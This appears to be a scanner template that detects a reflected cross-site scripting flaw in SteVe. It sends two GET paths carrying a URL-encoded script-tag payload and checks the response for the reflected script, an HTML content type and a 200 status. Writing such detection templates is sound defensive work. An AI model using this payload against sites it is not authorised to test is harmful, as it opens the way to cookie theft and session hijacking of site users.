id: steve-xss
name: SteVe - Cross-Site Scripting
severity: medium
confidence: confirmed
description: SteVe contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in the browser of
  an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication
  credentials and launch other attacks.
reference: CWE-80
tags:
- steve
- xss
- oss
- vuln
requests:
- method: GET
  path: /steve/services/"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/services/
  matchers: &id001
  - type: body
    words:
    - <script>alert(document.domain)</script>/services/?stylesheet=1">
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
- method: GET
  path: /services/"%3E%3Cscript%3Ealert(document.domain)%3C/script%3E/services/
  matchers: *id001
  condition: and
